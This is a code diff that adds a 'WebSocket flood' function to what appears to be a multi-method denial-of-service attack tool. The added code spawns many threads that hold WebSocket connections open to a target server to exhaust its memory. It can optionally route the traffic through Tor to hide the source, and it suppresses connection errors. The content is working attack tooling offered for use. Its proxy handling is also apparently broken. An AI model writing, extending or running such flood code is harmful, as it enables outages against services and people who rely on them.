@@ -15,6 +15,8 @@ import h2.events
 import socks
 import netifaces  # NEW: Import the netifaces library
 from queue import Queue  # NEW: Import Queue for thread-safe job management
+import asyncio  # NEW: Import for asynchronous operations
+import websockets # NEW: Import the websockets library
 
 
 # ==============================================================================
@@ -767,6 +769,69 @@ def attack_xmas_flood(target_url, port, duration, stop_event, pause_event, threa
             t = threading.Thread(target=xmas_worker, args=(stop_event, pause_event, ip, port, iface))
             t.daemon = True
             t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
+
+
+# --- NEW: WebSocket Flood ---
+async def websocket_worker_async(stop_event, pause_event, target_uri, proxy_opts):
+    """
+    Asynchronous worker that establishes and maintains a WebSocket connection.
+    It sends periodic pings to keep the connection alive, consuming server memory.
+    """
+    # The websockets library uses a URI format like "ws://example.com/chat"
+    # or "wss://example.com/socket" for secure connections.
+    try:
+        # The library handles SOCKS proxies via the `socks` parameter.
+        async with websockets.connect(target_uri, sock=proxy_opts) as websocket:
+            while not stop_event.is_set():
+                if pause_event.is_set():
+                    await asyncio.sleep(1)
+                    continue
+                try:
+                    # Send a ping every 15 seconds to keep the connection alive.
+                    await websocket.ping()
+                    await asyncio.sleep(15)
+                except websockets.ConnectionClosed:
+                    break  # Connection was closed by server, exit the loop
+    except Exception:
+        # Silently handle connection errors (e.g., target is down, handshake fails)
+        pass
+
+
+def websocket_worker_sync_wrapper(stop_event, pause_event, target_uri, use_proxy):
+    """
+    A synchronous wrapper to run the async websocket worker in a standard thread.
+    """
+    proxy_opts = None
+    if use_proxy:
+        # The websockets library needs the proxy details passed in this format
+        proxy = socks.socksocket()
+        proxy.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+        proxy_opts = proxy
+
+    # Run the async function until it completes
+    asyncio.run(websocket_worker_async(stop_event, pause_event, target_uri, proxy_opts))
+
+
+def attack_websocket_flood(target_domain, path, port, duration, stop_event, pause_event, sockets=100, use_proxy=False):
+    """Controller for WebSocket flood attacks."""
+    # Determine the scheme (ws or wss for secure)
+    scheme = "wss" if port == 443 else "ws"
+    target_uri = f"{scheme}://{target_domain}:{port}{path}"
+
+    print(f"[INFO] Targeting WebSocket endpoint: {target_uri}")
+
+    attack_end_time = time.time() + duration
+    for _ in range(sockets):
+        t = threading.Thread(
+            target=websocket_worker_sync_wrapper,
+            args=(stop_event, pause_event, target_uri, use_proxy)
+        )
+        t.daemon = True
+        t.start()
 
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
